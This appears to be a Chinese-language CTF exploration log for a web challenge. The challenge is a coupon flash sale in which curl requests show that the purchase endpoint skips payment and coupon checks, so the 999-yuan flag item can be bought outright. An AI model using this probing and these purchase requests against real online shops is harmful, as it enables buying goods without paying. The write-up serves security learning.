# a-10 · 探索记录

对应题解：[`a-10.md`](./a-10.md)。

## 目标与起点

题面：「秒杀活动，每人限领一张 10–100 元优惠券，Flag 商品 999 元，怎么买得起？」中等，500 分。

启动后 302 `/login`，登录页只有一个用户名输入框（没有密码）。

## 第一阶段：登录与页面结构

```bash
curl -c cj -X POST -d 'username=test1' http://$T/login
# 302 → /
```

首页四个商品，按钮把 id 和价格写死在前端：

```
openPurchaseModal(1,   '高端机械键盘',  299)
openPurchaseModal(2,   '无线降噪耳机',  599)
openPurchaseModal(3,   '智能手表Pro',  1299)
openPurchaseModal(999, 'Flag限量珍藏版', 999)
```

购买弹窗里有两个字段：`product_id` 和可多选的 `coupon_ids`；`updateTotal()` 只是前端算 `max(0, price - discount)` 用于展示。

## 第二阶段：领券

```bash
curl -b cj -X POST http://$T/claim_coupon
# {"coupon_id":"COUPON-75228","coupon_value":48,...}

curl -b cj -X POST http://$T/claim_coupon
# {"message":"您已经领取过优惠券了，每人限领一张！","success":false}
```

一张 48 元券。按「正常思路」，48 元券买 999 元商品是不可能的——这正是要验证的假设。

## 第三阶段：直接测购买接口

按前端给的商品 id 试三次：

```bash
curl -b cj -X POST -d 'product_id=1&coupon_ids=COUPON-75228'   http://$T/purchase
curl -b cj -X POST -d 'product_id=4&coupon_ids=COUPON-75228'   http://$T/purchase
curl -b cj -X POST -d 'product_id=999&coupon_ids=COUPON-75228' http://$T/purchase
```

三次都 302 回 `/`。再看首页的 flash 信息：

```
购买成功！原价299元，优惠48元，实付251元
商品不存在
🎉 恭喜购买成功！您的Flag: flag{7ae17a24-...}
```

- `product_id=1`：正常下单，299−48=251。
- `product_id=4`：`商品不存在`（4 不是有效 id）。
- `product_id=999`：**成功，并直接渲染 flag**。

**关键发现**：服务端没有「余额」或「实付金额」校验。999 元的商品用一个 48 元券就成单了。

## 第四阶段：确认漏洞形态

为了区分「券被重复使用」和「根本没有支付校验」，换一个新用户 `test2` 做对照：

| 请求 | 结果 |
| --- | --- |
| 新用户、不领券、`product_id=999` | 成功 + flag |
| 新用户、领券后连发两次 `product_id=999` | 两次都成功 + flag |
| 同一张券重复提交 | 都成功，券状态 `used:true` 也不影响 |

结论：**购买接口只检查商品 id，不检查支付、不检查优惠券是否已用、不检查余额。** 前端的价格计算和优惠券完全是展示层。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 再次领券 | 失败 | `每人限领一张` 只在领取时生效 |
| `product_id=4` | `商品不存在` | 商品表里没有 4 |
| 价格篡改（前端改 SDK） | 不需要 | 服务端不读客户端价格 |
| 优惠券重复使用 | 不必要 | 无券也能买 999 |
| **`product_id=999` 直接买** | **成功 + flag** | 无支付校验 |

## 这次真正的收获

1. **业务逻辑题先确认「服务端校验了什么」。** 前端的 `updateTotal()` 只是显示，成单时完全不看实付金额。
2. **题面里的「不可能」往往是提示。** 「999 元 vs 最多 100 元券」暗示价格不是门槛；直接提交高价商品 id 就能验证。
3. **商品 id 和价格都在前端。** `openPurchaseModal(999, ..., 999)` 已经把目标 id 写在 HTML 里，不用猜。
4. **用对照组区分漏洞形态。** 新用户无券也能买，说明不是「券重复使用」，而是「完全没有支付校验」；这个区别让写题解时的结论准确。
5. **命中后不要继续加固利用链。** 已经拿到 flag，价格篡改和竞态都是多余动作。
